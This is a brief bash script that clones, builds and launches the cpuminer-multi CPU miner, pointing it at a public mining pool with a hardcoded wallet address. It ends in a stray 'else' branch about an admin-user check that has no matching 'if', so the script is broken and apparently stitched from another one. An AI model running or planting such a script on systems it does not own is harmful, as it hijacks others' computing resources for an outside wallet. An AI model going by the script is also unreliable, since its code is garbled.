#!/bin/bash

  echo 'cpuminer-multi İnstall'
  git clone https://github.com/tpruvot/cpuminer-multi
  cd cpuminer-multi
  sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ -y
  ./build.sh
  ./cpuminer -a sha256d -o stratum+tcp://public-pool.io:21496 -u 32yiufypGWv9MN4z4cK4on3sFULgcPE38h.mexc -p x
else
    echo 'Error checking if admin user exists.  No changes made.';
